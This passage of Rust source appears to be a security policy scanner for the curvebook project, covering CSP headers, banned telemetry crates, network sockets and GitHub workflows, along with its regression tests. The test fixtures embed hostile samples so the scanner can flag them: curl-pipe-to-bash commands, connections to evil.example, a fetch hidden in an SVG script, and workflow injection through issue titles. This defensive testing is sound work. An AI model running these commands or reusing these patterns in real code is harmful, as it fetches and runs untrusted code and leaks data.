        || (tok == "blob:" && dir_name == "img-src")
}

fn validate_csp_directives(rel: &str, line: usize, csp: &str, violations: &mut Vec<TelemetryViolation>) {
    let directives: Vec<String> =
        csp.split(';').map(|d| d.split_whitespace().collect::<Vec<_>>().join(" ").to_ascii_lowercase()).filter(|d| !d.is_empty()).collect();

    let mut seen_names = BTreeSet::new();
    for dir in &directives {
        let dir_name = dir.split_whitespace().next().unwrap_or("");
        if !seen_names.insert(dir_name) {
            push_v(
                violations,
                5,
                rel,
                line,
                format!("`Content-Security-Policy` contains duplicate directive `{dir_name}` (W3C CSP3 first-directive shadowing)"),
            );
        }
    }

    for required in REQUIRED_CSP_DIRECTIVES {
        if !directives.iter().any(|d| d == required) {
            push_v(violations, 5, rel, line, format!("`Content-Security-Policy` missing exact directive `{required}`"));
        }
    }
    for dir in &directives {
        let dir_name = dir.split_whitespace().next().unwrap_or("");
        for tok in dir.split_whitespace().skip(1) {
            if !is_allowed_csp_source_token(dir_name, tok) {
                push_v(violations, 5, rel, line, format!("`Content-Security-Policy` forbids external/unsafe source `{tok}` in `{dir}`"));
            }
        }
    }
}

fn collect_workflow_and_action_files(root: &Path) -> Result<Vec<String>, String> {
    let mut out = Vec::new();
    let wf_dir = root.join(".github/workflows");
    if is_real_dir(&wf_dir) {
        walk_rel_files(root, &wf_dir, &|_| true, &|p| has_ext_ci(p, &["yml", "yaml"]), &mut out)?;
    }
    let actions_dir = root.join(".github/actions");
    if is_real_dir(&actions_dir) {
        walk_rel_files(root, &actions_dir, &|_| false, &|p| has_ext_ci(p, &["yml", "yaml"]), &mut out)?;
    }
    out.sort();
    out.dedup();
    Ok(out)
}

fn leading_spaces(s: &str) -> usize {
    s.bytes().take_while(|&b| b == b' ').count()
}

fn strip_yaml_comment(line: &str) -> &str {
    let bytes = line.as_bytes();
    let mut in_dq = false;
    let mut in_sq = false;
    let mut escaped = false;
    for (i, ch) in line.char_indices() {
        if in_dq {
            if escaped {
                escaped = false;
            } else if ch == '\\' {
                escaped = true;
            } else if ch == '"' {
                in_dq = false;
            }
        } else if in_sq {
            if ch == '\'' {
                in_sq = false;
            }
        } else {
            match ch {
                '"' => in_dq = true,
                '\'' => in_sq = true,
                '#' if i == 0 || bytes[i - 1].is_ascii_whitespace() => return line.get(..i).unwrap_or(line),
                _ => {}
            }
        }
    }
    line
}

#[cfg(test)]
mod tests {
    use std::path::Path;

    use super::{TelemetryViolation, is_banned_crate_name, run, run_checks};
    use crate::scan_util::test_support::{TestDir, to_utf16_bytes};

    fn create_clean_fixture(label: &str) -> TestDir {
        let dir = TestDir::new(&format!("tel-{label}"));
        for (rel, content) in [
            ("Cargo.toml", "[workspace]\nmembers = [\"crates/core\", \"crates/mcp\"]\n"),
            ("Cargo.lock", "[[package]]\nname = \"serde\"\nversion = \"1.0.229\"\n"),
            ("crates/core/Cargo.toml", "[package]\nname = \"curvebook-core\"\nversion = \"0.1.0\"\n[dependencies]\nserde = \"1\"\n"),
            (
                "crates/core/src/lib.rs",
                "// TcpStream in comment is fine\npub fn label() -> &'static str { \"std::net::TcpStream\" }\n#[cfg(test)]\nmod tests {\n    use std::net::UdpSocket;\n}\n",
            ),
            (
                "crates/mcp/src/tools.rs",
                "use std::net::{SocketAddr, TcpStream};\npub fn addr(port: u16) -> SocketAddr { SocketAddr::from(([127, 0, 0, 1], port)) }\n",
            ),
            ("apps/curvebook-web/index.html", "<!DOCTYPE html><html><body><svg xmlns=\"http://www.w3.org/2000/svg\"></svg></body></html>\n"),
            (
                ".github/workflows/ci.yml",
                "name: CI\non: [push]\npermissions:\n  contents: read\njobs:\n  gate:\n    runs-on: ubuntu-latest\n    steps:\n      - run: cargo test\n",
            ),
            (
                ".github/workflows/release.yml",
                "name: Release\non: [workflow_dispatch]\npermissions:\n  contents: read\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - run: cargo build\n  publish:\n    runs-on: ubuntu-latest\n    permissions:\n      contents: write\n    steps:\n      - run: echo ok\n",
            ),
            (
                "packaging/web/_headers",
                "/*\n  Content-Security-Policy: default-src 'self'; connect-src 'self'; object-src 'none'; frame-ancestors 'none'; base-uri 'self'; form-action 'none'\n  Referrer-Policy: no-referrer\n  Permissions-Policy: camera=(), microphone=(), geolocation=()\n  X-Content-Type-Options: nosniff\n  Cross-Origin-Opener-Policy: same-origin\n  Cross-Origin-Embedder-Policy: require-corp\n",
            ),
            (
                "packaging/web/.htaccess",
                "<IfModule mod_headers.c>\n  Header always set Content-Security-Policy \"default-src 'self'; connect-src 'self'; object-src 'none'; frame-ancestors 'none'; base-uri 'self'; form-action 'none'\"\n  Header always set Referrer-Policy \"no-referrer\"\n  Header always set Permissions-Policy \"camera=(), microphone=(), geolocation=()\"\n  Header always set X-Content-Type-Options \"nosniff\"\n  Header always set Cross-Origin-Opener-Policy \"same-origin\"\n  Header always set Cross-Origin-Embedder-Policy \"require-corp\"\n</IfModule>\n",
            ),
            ("packaging/windows/check.ps1", "while ($null -ne ($record = $view.Fetch())) {}\n"),
        ] {
            dir.write(rel, content);
        }
        dir
    }

    fn has_hit(hits: &[TelemetryViolation], check: u8, path: Option<&str>, needle: &str) -> bool {
        hits.iter().any(|v| v.check == check && path.is_none_or(|p| v.path == p) && v.detail.contains(needle))
    }

    fn has_bad_write(hits: &[TelemetryViolation], path: &str, scope: &str) -> bool {
        let prefix = format!("unexpected write permission `{scope}: write`");
        hits.iter().any(|v| v.check == 4 && v.path == path && v.detail.starts_with(&prefix))
    }

    #[test]
    fn clean_real_workspace_and_synthetic_fixture_pass() {
        let root = Path::new(env!("CARGO_MANIFEST_DIR")).parent().unwrap();
        let (stats, violations) = run_checks(root).unwrap();
        assert!(violations.is_empty(), "real workspace violations:\n{violations:?}");
        assert!(stats.manifests >= 20 && stats.lock_packages >= 20 && stats.rust_sources >= 50 && stats.workflows >= 4 && stats.header_configs == 2);
        run(root, &[]).unwrap();

        let dir = create_clean_fixture("clean");
        run(dir.path(), &[]).unwrap();
        assert!(run(dir.path(), &[String::from("--unknown")]).is_err());
    }

    #[test]
    fn checks_1_to_5_flag_banned_crates_net_web_workflows_and_headers() {
        for banned in ["sentry", "sentry-core", "opentelemetry_sdk", "tracing-opentelemetry", "posthog-rs", "reqwest", "hyper"] {
            assert!(is_banned_crate_name(banned), "{banned}");
        }
        for ok in ["hyperbolic", "serde"] {
            assert!(!is_banned_crate_name(ok), "{ok}");
        }

        type PolicyCase = (&'static str, &'static str, &'static str, u8, Option<&'static str>, &'static [&'static str]);
        let cases: &[PolicyCase] = &[
            (
                "c1-manifest",
                "crates/core/Cargo.toml",
                "[package]\nname = \"curvebook-core\"\n[dependencies]\nclient = { package = \"reqwest\", version = \"0.12\" }\n",
                1,
                None,
                &["reqwest"],
            ),
            ("c1-lock", "Cargo.lock", "[[package]]\nname = \"sentry-core\"\nversion = \"0.34.0\"\n", 1, Some("Cargo.lock"), &["sentry-core"]),
            (
                "c2-unapproved",
                "crates/core/src/net_bad.rs",
                "pub fn leak() { let _ = std::net::TcpStream::connect(\"1.2.3.4:80\"); }\n",
                2,
                Some("crates/core/src/net_bad.rs"),
                &["TcpStream"],
            ),
            (
                "c2-udp",
                "apps/curvebook/src/main.rs",
                "use std::net::UdpSocket;\npub fn f() { let _ = UdpSocket::bind(\"127.0.0.1:0\"); }\n",
                2,
                None,
                &["UdpSocket"],
            ),
            (
                "c2-no-loopback",
                "crates/ui-egui/src/control_io.rs",
                "use std::net::TcpListener;\npub fn bind_all() { let _ = TcpListener::bind(\"0.0.0.0:9000\"); }\n",
                2,
                None,
                &["loopback guard"],
            ),
            (
                "c3-wf",
                ".github/workflows/ci.yml",
                "name: CI\non: [push]\npermissions:\n  contents: read\njobs:\n  gate:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo $SONAR_TOKEN\n",
                3,
                None,
                &["sonar_token"],
            ),
            (
                "c3-web",
                "apps/curvebook-web/index.html",
                "<html><script>window.fetch('https://example.com/p'); navigator.sendBeacon('/t');</script></html>\n",
                3,
                None,
                &["fetch(", "sendbeacon", "https://example.com/p"],
            ),
            (
                "c4-perms",
                ".github/workflows/ci.yml",
                "name: CI\non: [push]\njobs:\n  gate:\n    runs-on: ubuntu-latest\n    steps:\n      - run: cargo test\n",
                4,
                None,
                &["contents: read"],
            ),
            (
                "c4-write",
                ".github/workflows/ci.yml",
                "name: CI\non: [push]\npermissions:\n  contents: read\njobs:\n  gate:\n    permissions:\n      contents: write\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo ok\n",
                4,
                None,
                &["write permission"],
            ),
            (
                "c4-inject",
                ".github/workflows/ci.yml",
                "name: CI\non: [issues]\npermissions:\n  contents: read\njobs:\n  gate:\n    runs-on: ubuntu-latest\n    steps:\n      - name: Bad\n        run: |\n          echo \"${{ github.event.issue.title }}\"\n",
                4,
                None,
                &["github.event."],
            ),
            (
                "c5-headers",
                "packaging/web/_headers",
                "/*\n  Content-Security-Policy: default-src 'self'; connect-src 'self' https://telemetry.example; object-src 'none'; frame-ancestors 'none'; base-uri 'self'; form-action 'none'\n  Referrer-Policy: no-referrer\n  Permissions-Policy: camera=(), microphone=()\n  X-Content-Type-Options: nosniff\n",
                5,
                Some("packaging/web/_headers"),
                &["connect-src 'self'", "geolocation=()"],
            ),
            (
                "c5-htaccess",
                "packaging/web/.htaccess",
                "<IfModule mod_headers.c>\n  Header always set X-Content-Type-Options \"nosniff\"\n</IfModule>\n",
                5,
                Some("packaging/web/.htaccess"),
                &["Content-Security-Policy", "Referrer-Policy"],
            ),
        ];
        for &(label, rel, body, check, path_opt, needles) in cases {
            let dir = create_clean_fixture(label);
            dir.write(rel, body);
            let (_, hits) = run_checks(dir.path()).unwrap();
            for &needle in needles {
                assert!(has_hit(&hits, check, path_opt, needle), "{label}: missing `{needle}` in {hits:?}");
            }
        }
    }

    #[test]
    fn check4_enforces_narrow_write_scopes_for_release_ci_and_pages_workflows() {
        let deploy_steps =
            "    steps:\n      - id: deployment\n        uses: actions/deploy-pages@368f82528645a54fb793d4d04e342629a3f51346 # v5.0.1\n";
        let ok_cases = [
            ("attest-ok", ".github/workflows/release.yml", "name: Release\non: [workflow_dispatch]\npermissions:\n  contents: read\njobs:\n  git-sources:\n    runs-on: ubuntu-latest\n    steps:\n      - run: cargo --version\n  publish:\n    runs-on: ubuntu-latest\n    permissions:\n      contents: write\n      id-token: write\n      attestations: write\n    steps:\n      - uses: actions/attest-build-provenance@4d101475d8b20a2381f78447822ac1eab6504dd8\n".to_owned()),
            ("prune-inline", ".github/workflows/ci.yml", "name: CI\non: [push]\npermissions:\n  contents: read\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - run: cargo test\n  prune-caches:\n    needs: [build]\n    runs-on: ubuntu-latest\n    permissions: { actions: write }\n    steps:\n      - run: gh cache list\n".to_owned()),
            ("prune-block", ".github/workflows/ci.yml", "name: CI\non: [push]\npermissions:\n  contents: read\njobs:\n  prune-caches:\n    runs-on: ubuntu-latest\n    permissions:\n      actions: write\n    steps:\n      - run: gh cache list\n".to_owned()),
            ("pages-block", ".github/workflows/pages.yml", format!("name: Pages\non: [push]\npermissions:\n  contents: read\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - run: cargo xtask pages-stage _site\n  deploy:\n    needs: build\n    runs-on: ubuntu-latest\n    permissions:\n      pages: write\n      id-token: write\n{deploy_steps}")),
            ("pages-inline", ".github/workflows/pages.yml", format!("name: Pages\non: [push]\npermissions:\n  contents: read\njobs:\n  deploy:\n    runs-on: ubuntu-latest\n    permissions: {{ pages: write, id-token: write }}\n{deploy_steps}")),
        ];
        for (label, rel, body) in &ok_cases {
            let dir = create_clean_fixture(label);
            dir.write(rel, body);
            let (_, hits) = run_checks(dir.path()).unwrap();
            assert!(hits.is_empty(), "{label}: expected pass, got {hits:?}");
        }

        let bad_cases: &[(&str, &str, String, &[&str])] = &[
            ("attest-top", ".github/workflows/release.yml", "name: Release\non: [workflow_dispatch]\npermissions:\n  contents: read\n  id-token: write\n  attestations: write\njobs:\n  publish:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo ok\n".into(), &["id-token", "attestations"]),
            ("attest-other-job", ".github/workflows/release.yml", "name: Release\non: [workflow_dispatch]\npermissions:\n  contents: read\njobs:\n  git-sources:\n    runs-on: ubuntu-latest\n    permissions:\n      id-token: write\n    steps:\n      - run: echo bad\n  linux:\n    runs-on: ubuntu-latest\n    permissions:\n      attestations: write\n    steps:\n      - run: echo bad\n  publish:\n    runs-on: ubuntu-latest\n    permissions:\n      contents: write\n    steps:\n      - run: echo ok\n".into(), &["id-token", "attestations"]),
            ("attest-ci", ".github/workflows/ci.yml", "name: CI\non: [push]\npermissions:\n  contents: read\njobs:\n  publish:\n    runs-on: ubuntu-latest\n    permissions:\n      id-token: write\n      attestations: write\n    steps:\n      - run: cargo test\n".into(), &["id-token", "attestations"]),
            ("attest-ci-top", ".github/workflows/ci.yml", "name: CI\non: [push]\npermissions:\n  contents: read\n  id-token: write\n  attestations: write\njobs:\n  gate:\n    runs-on: ubuntu-latest\n    steps:\n      - run: cargo test\n".into(), &["id-token", "attestations"]),
            ("attest-bad-scope", ".github/workflows/release.yml", "name: Release\non: [workflow_dispatch]\npermissions:\n  contents: read\njobs:\n  publish:\n    runs-on: ubuntu-latest\n    permissions:\n      contents: write\n      id-token: write\n      attestations: write\n      packages: write\n    steps:\n      - run: echo ok\n".into(), &["packages"]),
            ("prune-top", ".github/workflows/ci.yml", "name: CI\non: [push]\npermissions:\n  contents: read\n  actions: write\njobs:\n  prune-caches:\n    runs-on: ubuntu-latest\n    steps:\n      - run: gh cache list\n".into(), &["actions"]),
            ("prune-other-job", ".github/workflows/ci.yml", "name: CI\non: [push]\npermissions:\n  contents: read\njobs:\n  build:\n    runs-on: ubuntu-latest\n    permissions:\n      actions: write\n    steps:\n      - run: cargo test\n  prune-caches:\n    runs-on: ubuntu-latest\n    permissions:\n      contents: write\n    steps:\n      - run: echo bad\n".into(), &["actions", "contents"]),
            ("prune-other-wf", ".github/workflows/release.yml", "name: Release\non: [workflow_dispatch]\npermissions:\n  contents: read\njobs:\n  prune-caches:\n    runs-on: ubuntu-latest\n    permissions:\n      actions: write\n    steps:\n      - run: echo bad\n".into(), &["actions"]),
            ("pages-bad", ".github/workflows/pages.yml", format!("name: Pages\non: [push]\npermissions:\n  contents: read\n  pages: write\njobs:\n  build:\n    runs-on: ubuntu-latest\n    permissions:\n      id-token: write\n    steps:\n      - run: echo bad\n  deploy:\n    runs-on: ubuntu-latest\n    permissions:\n      pages: write\n      contents: write\n{deploy_steps}"), &["pages", "id-token", "contents"]),
            ("pages-other-wf", ".github/workflows/release.yml", "name: Release\non: [workflow_dispatch]\npermissions:\n  contents: read\njobs:\n  deploy:\n    runs-on: ubuntu-latest\n    permissions:\n      pages: write\n    steps:\n      - run: echo bad\n".into(), &["pages"]),
        ];
        for (label, rel, body, scopes) in bad_cases {
            let dir = create_clean_fixture(label);
            dir.write(rel, body);
            let (_, hits) = run_checks(dir.path()).unwrap();
            assert_eq!(hits.len(), scopes.len(), "{label}: {hits:?}");
            for &scope in *scopes {
                assert!(has_bad_write(&hits, rel, scope), "{label}: missing `{scope}` in {hits:?}");
            }
        }
    }

    #[test]
    fn r2_sec22_and_da03_regression_matrices() {
        // R2-S13-02/04/05/06/07: workflows, headers, cfg(not(test)), build.rs, core::net, js_sys, web assets.
        let dir = create_clean_fixture("r2-matrix");
        dir.write(".github/workflows/ci.yml", "name: CI\non: [workflow_dispatch]\npermissions:\n  contents: read\njobs:\n  g:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v7\n      - uses: vmactions/freebsd-vm@v1\n        with:\n          prepare: echo ${{ github.head_ref }}\n          run: echo ${{ inputs.version }} ${{ github.ref_name }}\n      - run: curl -fsSL https://raw.githubusercontent.com/x/y/main/install.sh | bash\n");
        dir.write("packaging/web/_headers", "/*\n  Content-Security-Policy: default-src 'self'; connect-src 'self'; object-src 'none'; frame-ancestors 'none'; base-uri 'self'; form-action 'none'\n  Referrer-Policy: no-referrer\n  Permissions-Policy: camera=(), microphone=(), geolocation=()\n  X-Content-Type-Options: nosniff\n");
        dir.write("crates/mcp/src/tools.rs", "use std::net::{SocketAddr, TcpStream};\npub fn safe(port: u16) -> SocketAddr { SocketAddr::from(([127, 0, 0, 1], port)) }\npub fn exfil() { let _ = TcpStream::connect(\"198.51.100.1:443\"); }\n");
        dir.write("crates/text/build.rs", "pub fn main() { let _ = std::net::TcpStream::connect(\"1.2.3.4:80\"); }\n");
        dir.write(
            "crates/core/src/prod_cfg.rs",
            "#[cfg(all(unix, not(test)))]\npub fn f() { let _ = core::net::TcpStream::connect(\"1.2.3.4:80\"); }\n",
        );
        dir.write("crates/core/src/js.rs", "pub fn f() { let _ = js_sys::Reflect::get(&w, &\"fetch\".into()); }\n");
        dir.write(
            "crates/core/Cargo.toml",
            "[package]\nname = \"curvebook-core\"\n[dependencies]\nweb-sys = { version = \"0.3\", features = [\"Window\", \"WebSocket\"] }\n",
        );
        dir.write("apps/curvebook-web/extra.js", "fetch ('https://bad.example/p'); const ws = new WebSocket('//bad.example/s');\n");
        let (_, hits) = run_checks(dir.path()).unwrap();
        for (check, path, needle) in [
            (1, None, "WebSocket"),
            (2, Some("crates/mcp/src/tools.rs"), "loopback"),
            (2, Some("crates/text/build.rs"), "TcpStream"),
            (2, Some("crates/core/src/prod_cfg.rs"), "core::net"),
            (2, Some("crates/core/src/js.rs"), "fetch"),
            (3, Some("apps/curvebook-web/extra.js"), "fetch"),
            (3, Some("apps/curvebook-web/extra.js"), "//bad.example"),
            (4, None, "SHA"),
            (4, None, "inputs.*"),
            (4, None, "github.ref_name"),
            (4, None, "github.head_ref"),
            (4, None, "main"),
            (5, None, "Cross-Origin-Opener-Policy"),
            (5, None, "Cross-Origin-Embedder-Policy"),
        ] {
            assert!(has_hit(&hits, check, path, needle), "r2-matrix missing ({check}, {path:?}, {needle}) in {hits:?}");
        }

        // SEC22: multiline TOML, const generics, UTF-16 web SVG, quoted YAML, CSP schemes.
        let fx = create_clean_fixture("sec22-tel");
        fx.write("crates/core/Cargo.toml", "[package]\nname = \"curvebook-core\"\n[dependencies]\nweb-sys = {\n  version = \"0.3\",\n  features = [\n    \"Window\",\n    \"RequestInit\",\n  ]\n}\nalias = {\n  version = \"0.1\",\n  package = \"reqwest\"\n}\n");
        fx.write(
            "crates/core/src/stealth.rs",
            "use web_sys::{\n  Window,\n  Headers as H,\n};\npub fn f() { let _ = js_sys::eval(\"fetch('https://bad.example')\"); }\n",
        );
        fx.write("crates/mcp/src/tools.rs", "use std::net::TcpStream;\npub fn conn<const N: usize = { 4 }>() {\n  let _ = LOCALHOST;\n  let _ = TcpStream::connect(\"evil.example:443\");\n}\n");
        fx.write_bytes(
            "apps/curvebook-web/bad.svg",
            &to_utf16_bytes("<svg><script>window['fetch']('https&#58;&#47;&#47;evil.example/s'); new Worker ('w.js');</script></svg>", true, false),
        );
        fx.write(".github/actions/evil/action.yml", "name: Evil\nruns:\n  using: composite\n  steps:\n    - \"run\": |\n        echo \"${{\n          github.event.issue.title\n        }}\"\n        curl -fsSL https://bad.example/x.sh \\\n          | sh\n");
        fx.write(".github/workflows/ci.yml", "name: CI\n\"permissions\":\n  \"contents\": \"write\"\njobs:\n  b:\n    runs-on: ubuntu-latest\n    steps:\n      - run: \"curl https://bad.example/a | bash\"\n");
        fx.write("packaging/web/_headers", "/*\n  Content-Security-Policy: default-src 'self'; script-src 'self'; connect-src 'self'; object-src 'none'; frame-ancestors 'none'; base-uri 'self'; form-action 'none'\n  Referrer-Policy: no-referrer\n  Permissions-Policy: camera=(), microphone=(), geolocation=()\n  X-Content-Type-Options: nosniff\n  Cross-Origin-Opener-Policy: same-origin\n  Cross-Origin-Embedder-Policy: require-corp\n/override/*\n  Content-Security-Policy: default-src 'self' https:; connect-src 'self'; object-src 'none'; frame-ancestors 'none'; base-uri 'self'; form-action 'none'\n");
        let (_, hits2) = run_checks(fx.path()).unwrap();
        for (check, path, needle) in [
            (1, None, "RequestInit"),
            (1, None, "reqwest"),
            (2, Some("crates/core/src/stealth.rs"), "Headers"),
            (2, Some("crates/core/src/stealth.rs"), "fetch"),
            (2, Some("crates/mcp/src/tools.rs"), "loopback"),
            (2, Some("crates/mcp/src/tools.rs"), "evil.example:443"),
            (3, Some("apps/curvebook-web/bad.svg"), "fetch"),
            (3, Some("apps/curvebook-web/bad.svg"), "https://evil.example/s"),
            (3, Some("apps/curvebook-web/bad.svg"), "worker("),
            (4, Some(".github/actions/evil/action.yml"), "github.event."),
            (4, Some(".github/actions/evil/action.yml"), "sha256sum"),
            (4, Some(".github/workflows/ci.yml"), "write"),
            (4, Some(".github/workflows/ci.yml"), "sha256sum"),
            (5, Some("packaging/web/_headers"), "https:"),
        ] {
            assert!(has_hit(&hits2, check, path, needle), "sec22 missing ({check}, {path:?}, {needle}) in {hits2:?}");
        }

        // DA-03-07: char quotes, raw prefixes, unicode/hex escapes, line continuations.
        let fx3 = create_clean_fixture("da-03-07-tel");
        fx3.write("crates/core/src/wasm_evasion.rs", "pub fn f() {\n    let _ = js_sys::eval(\"ok\");\n    let _q = '\"';\n    let _a = \"fetch\";\n    let _b = br#\"websocket\"#;\n    let _c = cr#\"eventsource\"#;\n    let _d = \"\\u{66}etch\";\n    let _e = \"\\x66etch\";\n    let _f = \"fe\\\n\n    tch\";\n}\n");
        fx3.write("crates/mcp/src/tools.rs", "use std::net::TcpStream;\npub fn conn() {\n    let _ = LOCALHOST;\n    let _q = '\"';\n    let _ = TcpStream::connect(\"8.8.8.\\\n\n    8:80\");\n}\n");
        let (_, hits3) = run_checks(fx3.path()).unwrap();
        assert_eq!(hits3.iter().filter(|v| v.path == "crates/core/src/wasm_evasion.rs").count(), 6, "{hits3:?}");
        assert!(has_hit(&hits3, 2, Some("crates/mcp/src/tools.rs"), "8.8.8.8:80"), "{hits3:?}");
    }

    #[test]
    fn aud_12_13_14_15_33_49_hardened_telemetry_regression_suite() {
        // AUD-12-14: [features] forwarding, dotted keys, quoted section headers, TOML \uXXXX escapes.
        let fx1 = create_clean_fixture("aud12-14");
        fx1.write(
            "crates/core/Cargo.toml",
            "[package]\nname = \"curvebook-core\"\n[features]\ndefault = [\"web-sys/WebSocket\", \"web-sys?/XmlHttpRequest\"]\n[dependencies]\nweb-sys.features = [\"Window\", \"\\u0042eacon\"]\nreqwest.version = \"0.12\"\nclient.package = \"ureq\"\n[dependencies.\"web-sys\"]\nfeatures = [\"EventSource\"]\n",
        );
        let (_, hits1) = run_checks(fx1.path()).unwrap();
        for needle in ["WebSocket", "XmlHttpRequest", "Beacon", "reqwest", "ureq", "EventSource"] {
            assert!(has_hit(&hits1, 1, Some("crates/core/Cargo.toml"), needle), "AUD-12-14 missing `{needle}` in {hits1:?}");
        }

        // AUD-12-13: bare host-source, duplicate CSP directive shadowing, .htaccess unset & scoped blocks.
        let fx2 = create_clean_fixture("aud12-13");
        fx2.write(
            "packaging/web/_headers",
            "/*\n  Content-Security-Policy: default-src 'self'; connect-src 'self' exfil.example; connect-src 'self'; script-src 'self' evil.example; object-src 'none'; frame-ancestors 'none'; base-uri 'self'; form-action 'none'\n  Referrer-Policy: no-referrer\n  Permissions-Policy: camera=(), microphone=(), geolocation=()\n  X-Content-Type-Options: nosniff\n  Cross-Origin-Opener-Policy: same-origin\n  Cross-Origin-Embedder-Policy: require-corp\n",
        );
        fx2.write(
            "packaging/web/.htaccess",
            "<IfModule mod_headers.c>\n  <FilesMatch \"^never$\">\n    Header always set Content-Security-Policy \"default-src 'self'; connect-src 'self'; object-src 'none'; frame-ancestors 'none'; base-uri 'self'; form-action 'none'\"\n  </FilesMatch>\n  Header always set Referrer-Policy \"no-referrer\"\n  Header always unset Referrer-Policy\n  Header always set Permissions-Policy \"camera=(), microphone=(), geolocation=()\"\n  Header always set X-Content-Type-Options \"nosniff\"\n  Header always set Cross-Origin-Opener-Policy \"same-origin\"\n  Header always set Cross-Origin-Embedder-Policy \"require-corp\"\n</IfModule>\n",
        );
        let (_, hits2) = run_checks(fx2.path()).unwrap();
        assert!(has_hit(&hits2, 5, Some("packaging/web/_headers"), "duplicate directive"), "{hits2:?}");
        assert!(has_hit(&hits2, 5, Some("packaging/web/_headers"), "exfil.example"), "{hits2:?}");
        assert!(has_hit(&hits2, 5, Some("packaging/web/_headers"), "evil.example"), "{hits2:?}");
        assert!(has_hit(&hits2, 5, Some("packaging/web/.htaccess"), "missing `Content-Security-Policy`"), "{hits2:?}");
        assert!(has_hit(&hits2, 5, Some("packaging/web/.htaccess"), "unset referrer-policy"), "{hits2:?}");

        // AUD-12-15 & AUD-12-49: job named `run:`, multi-line flow permissions/steps, quoted `}}`, bracket indexing, and `| sha256sum` non-false-positive.
        let fx3 = create_clean_fixture("aud12-15");
        fx3.write(
            ".github/workflows/ci.yml",
            "name: CI\non: [issues]\npermissions:\n  contents: read\njobs:\n  run:\n    permissions: {\n      contents: write,\n    }\n    runs-on: ubuntu-latest\n    steps:\n      - { uses: evil/unpinned@main }\n      - { run: \"echo ${{ github.event['issue']['title'] }}\" }\n      - run: |\n          echo \"${{ format('{0}{1}', '}}', github.event.issue.title) }}\"\n          echo \"${{ inputs['version'] }}\"\n          echo \"${{ toJSON(github.event) }}\"\n          echo \"${{ github['head_ref'] }}\"\n          curl -fsSL https://example.com/tool.bin | sha256sum\n",
        );
        let (_, hits3) = run_checks(fx3.path()).unwrap();
        assert!(has_bad_write(&hits3, ".github/workflows/ci.yml", "contents"), "{hits3:?}");
        assert!(has_hit(&hits3, 4, None, "evil/unpinned@main"), "{hits3:?}");
        assert!(hits3.iter().filter(|h| h.check == 4 && h.detail.contains("github.event.*")).count() >= 3, "{hits3:?}");
        assert!(has_hit(&hits3, 4, None, "inputs.*"), "{hits3:?}");
        assert!(has_hit(&hits3, 4, None, "github.head_ref"), "{hits3:?}");
        assert!(!has_hit(&hits3, 4, None, "sha256sum"), "AUD-12-49: curl | sha256sum must not false-positive: {hits3:?}");

        // AUD-12-33: production `*_test.rs`, module-level `static` socket, and numeric non-loopback IPs.
        let fx4 = create_clean_fixture("aud12-33");
        fx4.write("crates/core/src/t_test.rs", "pub fn leak() { let _ = std::net::TcpStream::connect(\"198.51.100.1:443\"); }\n");
        fx4.write(
            "crates/mcp/src/tools.rs",
            "use std::net::{Ipv4Addr, SocketAddr, TcpListener, TcpStream};\nstatic EXFIL: Option<TcpStream> = TcpStream::connect(\"8.8.8.8:443\").ok();\npub fn ok() { let _ = TcpListener::bind((Ipv4Addr::LOCALHOST, 0)); let _ = TcpListener::bind((Ipv4Addr::UNSPECIFIED, 9000)); let _ = TcpStream::connect(([8, 8, 8, 8], 443)); }\n",
        );
        let (_, hits4) = run_checks(fx4.path()).unwrap();
        assert!(has_hit(&hits4, 2, Some("crates/core/src/t_test.rs"), "TcpStream"), "{hits4:?}");
        assert!(has_hit(&hits4, 2, Some("crates/mcp/src/tools.rs"), "8.8.8.8:443"), "{hits4:?}");
        assert!(has_hit(&hits4, 2, Some("crates/mcp/src/tools.rs"), "Ipv4Addr::UNSPECIFIED"), "{hits4:?}");

        // #188 follow-ups:
        // 1. AUD-12-13: Apache Header edit/edit*/merge mutators + IfDefine/IfVersion/IfDirective/IfSection/IfFile/negated IfModule.
        let fx5 = create_clean_fixture("aud12-13-mutators");
        fx5.write(
            "packaging/web/.htaccess",
            "<IfModule mod_headers.c>\n  Header always set Content-Security-Policy \"default-src 'self'; connect-src 'self'; object-src 'none'; frame-ancestors 'none'; base-uri 'self'; form-action 'none'\"\n  Header always edit Content-Security-Policy \"connect-src 'self'\" \"connect-src *\"\n  Header always edit* Referrer-Policy \"no-referrer\" \"unsafe-url\"\n  Header always merge Permissions-Policy \"camera=*\"\n  <IfDefine NEVER>\n    Header always set Referrer-Policy \"no-referrer\"\n  </IfDefine>\n  <IfModule !mod_headers.c>\n    Header always set X-Content-Type-Options \"nosniff\"\n  </IfModule>\n  Header always set Permissions-Policy \"camera=(), microphone=(), geolocation=()\"\n  Header always set Cross-Origin-Opener-Policy \"same-origin\"\n  Header always set Cross-Origin-Embedder-Policy \"require-corp\"\n</IfModule>\n",
        );
        let (_, hits5) = run_checks(fx5.path()).unwrap();
        for needle in [
            "edit content-security-policy",
            "edit* referrer-policy",
            "merge permissions-policy",
            "missing `Referrer-Policy",
            "missing `X-Content-Type-Options",
        ] {
            assert!(has_hit(&hits5, 5, Some("packaging/web/.htaccess"), needle), "missing `{needle}` in {hits5:?}");
        }

        // 2. AUD-12-14: `path = "../package"`, multiline TOML strings, top-level dotted features, workspace web-sys aliases.
        let fx6 = create_clean_fixture("aud12-14-toml");
        fx6.write(
            "Cargo.toml",
            "[workspace]\nmembers = [\"crates/core\"]\n[workspace.dependencies]\nws_alias = { path = \"../package\", version = \"0.3\", package = \"\"\"\nweb-\\\nsys\"\"\" }\n",
        );
        fx6.write(
            "crates/core/Cargo.toml",
            "features.default = [\"ws_alias/WebSocket\"]\n[package]\nname = \"curvebook-core\"\n[dependencies]\nws_alias = { workspace = true, features = ['''EventSource'''] }\nlocal_ws = { path = \"../package\", version = \"0.3\", package = \"web-sys\", features = [\"Beacon\"] }\n",
        );
        let (_, hits6) = run_checks(fx6.path()).unwrap();
        for needle in ["WebSocket", "EventSource", "Beacon"] {
            assert!(has_hit(&hits6, 1, Some("crates/core/Cargo.toml"), needle), "missing `{needle}` in {hits6:?}");
        }

        // 3. AUD-12-15 & AUD-12-49: flow-sequence steps, multiline flow run+uses, next-line flow permissions, shell delimiters & sudo -u root sh.
        let fx7 = create_clean_fixture("aud12-15-49-flow");
        fx7.write(
